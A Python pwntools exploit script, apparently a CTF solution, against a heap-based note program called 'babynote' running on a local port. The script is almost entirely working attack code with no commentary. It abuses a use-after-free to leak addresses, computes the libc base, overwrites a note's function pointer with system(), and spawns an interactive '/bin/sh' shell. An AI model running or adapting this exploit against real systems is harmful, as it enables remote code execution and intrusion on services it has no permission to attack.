from pwn import*

printf_got = 0x3010
libc_system = 0x0003ADA0
libc_printf  = 0x00049670 

def add(size,content):
	io.recvuntil("Your choice :")
	io.sendline('1')
	io.recvuntil("Content size:")
	io.sendline(size)
	io.recvuntil("Input the content:")
	io.send(content)
	io.recvuntil("Success !\n")
	
def edit(index,content):
	io.recvuntil("Your choice :")
	io.sendline('2')
	io.recvuntil("Input the index:")
	io.sendline(index)
	io.recvuntil("New content:")
	io.sendline(content)
	io.recvuntil("Success !\n")

def delete(index):
	io.recvuntil("Your choice :")
	io.sendline('4')
	io.recvuntil("Input the index:")
	io.sendline(index)
	io.recvuntil("Success !\n")

def printnote(index,flag = 0):
	io.recvuntil("Your choice :")
	io.sendline('3')	
	io.recvuntil("Input the index:")
	io.sendline(index)
	if flag == 0:
		io.recvuntil("aaaaaaa\n")
		addr = io.recv(4)
		io.recvuntil("\n")
		return int(addr[0:4][::-1].encode("hex"),16)
	else:
		addr = io.recvuntil("\n")
		return int(addr[0:4][::-1].encode("hex"),16)

def exit():
	io.recvuntil("Your choice :")
	io.sendline('5')

#io = process("./babynote")
io = remote("127.0.0.1",40004)

add('100',"111\n")
add('100',"222\n")
delete('0')
delete('1')
add('12',"aaaaaaa\n")
v_func = printnote('2')
elf_base = v_func - 0x98a
printf_got = elf_base + printf_got

print "v_func: " + hex(v_func)
print "elf_base: " + hex(elf_base)
print "printf_got: " + hex(printf_got)

edit('2',p32(0xc) + p32(printf_got) + p32(v_func))
printf_addr = printnote('0',1)
libc_base = printf_addr - libc_printf
system_addr = libc_base + libc_system

print "libc_base: " + hex(libc_base)
print "printf: " + hex(printf_addr)
print "system: " + hex(system_addr)

edit('2',"/bin/sh\x00" + p32(system_addr))
io.recvuntil("Your choice :")
io.sendline('3')	
io.recvuntil("Input the index:")
io.sendline("0")
io.interactive()
io.close()
